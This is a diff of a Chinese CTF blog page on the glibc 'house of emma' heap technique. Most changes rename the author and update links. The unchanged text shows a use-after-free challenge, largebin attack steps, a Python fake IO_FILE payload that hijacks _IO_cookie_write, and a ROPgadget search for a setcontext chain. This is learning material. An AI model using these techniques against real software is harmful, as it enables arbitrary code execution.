@@ -6,7 +6,7 @@
   <meta name="renderer" content="webkit">
   <meta http-equiv="X-UA-Compatible" content="IE=edge" >
   <link rel="dns-prefetch" href="https://1uckyc.github.io">
-  <title>house-of-emma学习以及复现 | luckyc&#39;s blog</title>
+  <title>house-of-emma学习以及复现 | 1uckyc&#39;s blog</title>
   <meta name="generator" content="hexo-theme-yilia-plus">
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
   
@@ -14,7 +14,7 @@
 <meta property="og:type" content="article">
 <meta property="og:title" content="house-of-emma学习以及复现">
 <meta property="og:url" content="https://1uckyc.github.io/2023/09/17/house-of-emma%E5%AD%A6%E4%B9%A0%E4%BB%A5%E5%8F%8A%E5%A4%8D%E7%8E%B0/index.html">
-<meta property="og:site_name" content="luckyc&#39;s blog">
+<meta property="og:site_name" content="1uckyc&#39;s blog">
 <meta property="og:description" content="house of emma参考：   桥下少年emma也是利用house of kiwi的触发assert机制，house of kiwi是去走的fflush--&gt;__sync__house of emma 是走的 fxprintf --&gt; __locked_vfxprinf --&gt; __vfprintf_internal --&gt; _IO_default_xsputn通过修">
 <meta property="og:locale" content="en_US">
 <meta property="og:image" content="https://1uckyc.github.io/2023/09/17/house-of-emma%E5%AD%A6%E4%B9%A0%E4%BB%A5%E5%8F%8A%E5%A4%8D%E7%8E%B0/1694868834998-4049b689-4295-45ac-a9a8-c6dd8a3649c0.png">
@@ -35,8 +35,8 @@
 <meta property="og:image" content="https://1uckyc.github.io/2023/09/17/house-of-emma%E5%AD%A6%E4%B9%A0%E4%BB%A5%E5%8F%8A%E5%A4%8D%E7%8E%B0/1694860262323-4922f196-d243-4d6e-93df-652d9c47e286.png">
 <meta property="og:image" content="https://1uckyc.github.io/2023/09/17/house-of-emma%E5%AD%A6%E4%B9%A0%E4%BB%A5%E5%8F%8A%E5%A4%8D%E7%8E%B0/1694860328069-13f93d60-92b1-41c3-8cc2-1354c91baf65.png">
 <meta property="article:published_time" content="2023-09-17T10:02:29.000Z">
-<meta property="article:modified_time" content="2024-03-15T11:49:19.159Z">
-<meta property="article:author" content="luckyc">
+<meta property="article:modified_time" content="2024-03-15T12:00:12.370Z">
+<meta property="article:author" content="1uckyc">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:image" content="https://1uckyc.github.io/2023/09/17/house-of-emma%E5%AD%A6%E4%B9%A0%E4%BB%A5%E5%8F%8A%E5%A4%8D%E7%8E%B0/1694868834998-4049b689-4295-45ac-a9a8-c6dd8a3649c0.png">
   
@@ -80,7 +80,7 @@
 			<img src="/img/head.jpg" class="js-avatar">
 		</a>
 		<hgroup>
-			<h1 class="header-author"><a href="/">luckyc</a></h1>
+			<h1 class="header-author"><a href="/">1uckyc</a></h1>
 		</hgroup>
 		
 		<p class="header-subtitle">Welcome to my blog </p>
@@ -140,7 +140,7 @@
 				</a>
 			</div>
 			<hgroup>
-			  <h1 class="header-author js-header-author">luckyc</h1>
+			  <h1 class="header-author js-header-author">1uckyc</h1>
 			</hgroup>
 			
 			<p class="header-subtitle"><i class="icon icon-quo-left"></i>Welcome to my blog <i class="icon icon-quo-right"></i></p>
@@ -265,12 +265,12 @@
 <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">_DWORD *__fastcall <span class="title function_">sub_149C</span><span class="params">(__int64 a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  _DWORD *result; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">unsigned</span> __int8 v2; <span class="comment">// [rsp+1Dh] [rbp-13h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int16 v3; <span class="comment">// [rsp+1Eh] [rbp-12h]</span></span><br><span class="line"></span><br><span class="line">  v2 = *(a1 + <span class="number">1</span>);</span><br><span class="line">  v3 = *(a1 + <span class="number">2</span>);</span><br><span class="line">  <span class="keyword">if</span> ( v3 &lt;= <span class="number">0x40F</span>u || v3 &gt; <span class="number">0x500</span>u || v2 &gt; <span class="number">0x10</span>u )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;ERROR&quot;</span>);</span><br><span class="line">    _exit(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  chunk_ptr_4040[v2] = <span class="built_in">calloc</span>(<span class="number">1uLL</span>, v3);</span><br><span class="line">  result = chunk_size_40c0;</span><br><span class="line">  chunk_size_40c0[v2] = v3;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
 <p>delete：uaf<br>show：正常打印<br>edit：正常修改</p>
-<h4 id="思路及过程"><a href="#思路及过程" class="headerlink" title="思路及过程"></a>思路及过程</h4><p>有了上文章house of emma的学习这题也就有了大致的思路，<br>存在uaf，largebin attack挺方便的，先去泄露地址，然后largebin修改stderr、libc_base-0x2890，然后就是布置偏移、伪造IO_FILE，不过实际过程还是有点绕<br>1、先泄露地址<br>2、然后利用 largebin attack去修改stderr：<br>3、利用largebin attack修改libc_base-0x2890：<br>4、修改top_chunk的size，为触发assert做准备，前几步都比较常规吧、就不粘payload的了<br>5、伪造IO_FILE：网上师傅可能伪造了<code>_IO_write_ptr</code>等数据吧，但xshhc师傅分享了这条利用链过程，实际只需要<code>_lock</code>写入一个可写入的地址，_mode也不用限制，最重要的就是修改vtable</p>
+<h4 id="思路及过程"><a href="#思路及过程" class="headerlink" title="思路及过程"></a>思路及过程</h4><p>有了上文章house of emma的学习这题也就有了大致的思路，<br>存在uaf，largebin attack挺方便的，先去泄露地址，然后largebin修改stderr、libc_base-0x2890，然后就是布置偏移、伪造IO_FILE，不过实际过程还是有点绕<br>1、先泄露地址<br>2、然后利用 largebin attack去修改stderr：<br>3、利用largebin attack修改libc_base-0x2890：<br>4、修改top_chunk的size，为触发assert做准备，前几步都比较常规吧、就不粘payload的了<br>5、伪造IO_FILE：网上师傅可能伪造了<code>_IO_write_ptr</code>等数据，但xshhc师傅分享了这条利用链过程，实际只需要<code>_lock</code>写入一个可写入的地址，_mode也不用限制，最重要的就是修改vtable</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">fake_io = p64(<span class="number">0</span>)</span><br><span class="line">fake_io = fake_io.ljust(<span class="number">0x78</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_io += p64(heap_base) 		 <span class="comment"># _lock 可写地址</span></span><br><span class="line">fake_io = fake_io.ljust(<span class="number">0xB0</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_io += p64(<span class="number">0</span>)  			<span class="comment"># _mode = 0</span></span><br><span class="line">fake_io = fake_io.ljust(<span class="number">0xC8</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_io += p64(iO_cookie_jumps+<span class="number">0x40</span>)  	<span class="comment">#vtable</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#rdi = stderr </span></span><br><span class="line"><span class="comment">#_io_cooklie_write --&gt; rdi+0xf0</span></span><br><span class="line">fake_io += p64(srop_adr)  <span class="comment"># 执行gadget_adr时rdi	0xe0</span></span><br><span class="line">fake_io += p64(<span class="number">0</span>)</span><br><span class="line">fake_io += p64(ROL(gadget_adr ^ (heap_base + <span class="number">0x2ae0</span>),<span class="number">0x11</span>))	<span class="comment">#0xf0</span></span><br></pre></td></tr></table></figure>
 
 <p>_IO_cookie_jumps + 0x40 + 0x38 –&gt; _IO_cookie_write</p>
 <p><img src="/2023/09/17/house-of-emma%E5%AD%A6%E4%B9%A0%E4%BB%A5%E5%8F%8A%E5%A4%8D%E7%8E%B0/1694872826262-efaa3d3a-f9d8-4513-b318-33f0851dce2f.png" alt="img"></p>
-<p>进入_IO_cookie_write之后 两个重要的地方 (rdi  &#x3D; stderr) 这里我不确定rdi怎么来的就一路往前看，发现就是开始从stderr中赋值来的<br>rax  &#x3D;  rdi+0xf0 (要绕过检测)    –&gt;   call rax<br>rdi  &#x3D;  rdi + 0xe0 </p>
+<p>进入_IO_cookie_write之后 两个重要的地方 (rdi  &#x3D; stderr) 这里可以回溯一下rdi，发现是开始从stderr中赋值来的<br>rax  &#x3D;  rdi+0xf0 (要绕过检测)    –&gt;   call rax<br>rdi  &#x3D;  rdi + 0xe0 </p>
 <p><img src="/2023/09/17/house-of-emma%E5%AD%A6%E4%B9%A0%E4%BB%A5%E5%8F%8A%E5%A4%8D%E7%8E%B0/1694873058806-327cfd72-e3d2-45ee-98cf-8d25f978c94d.png" alt="img"></p>
 <p>所以我们可以控制这两块地址去控制执行流，但怎么利用call去执行orw呢？这里就接触到了一个新知识<br>思路就是还是去利用setcontext+61–&gt;orw，但setcontext需要rdx，这里去找一个符合的gadget</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ROPgadget --binary ./libc.so<span class="number">.6</span> --only <span class="string">&quot;mov|call&quot;</span> | grep <span class="string">&quot;rdx&quot;</span> | grep <span class="string">&quot;rdi&quot;</span> </span><br></pre></td></tr></table></figure>
@@ -302,7 +302,7 @@
       <ul class="post-copyright">
         <li>
           <strong>本文作者：</strong>
-          luckyc
+          1uckyc
         </li>
         <li>
           <strong>本文链接：</strong>
@@ -388,11 +388,11 @@
 
 <nav id="article-nav">
   
-    <a href="/2023/11/24/cve-2018-17066%E5%A4%8D%E7%8E%B0/" id="article-nav-newer" class="article-nav-link-wrap">
+    <a href="/2023/09/24/house-of-cat%E5%AD%A6%E4%B9%A0%E4%BB%A5%E5%8F%8A%E5%A4%8D%E7%8E%B0/" id="article-nav-newer" class="article-nav-link-wrap">
       <i class="icon-circle-left"></i>
       <div class="article-nav-title">
         
-          cve-2018-17066复现
+          house-of-cat学习以及复现
         
       </div>
     </a>
@@ -450,7 +450,7 @@
   <div class="outer">
     <div id="footer-info">
     	<div class="footer-left">
-    		&copy; 2022-2024 <a href="https://1uckyc.github.io/" target="_blank">luckyc</a>
+    		&copy; 2022-2024 <a href="https://1uckyc.github.io/" target="_blank">1uckyc</a>
     	</div>
       	<div class="footer-right">
 			
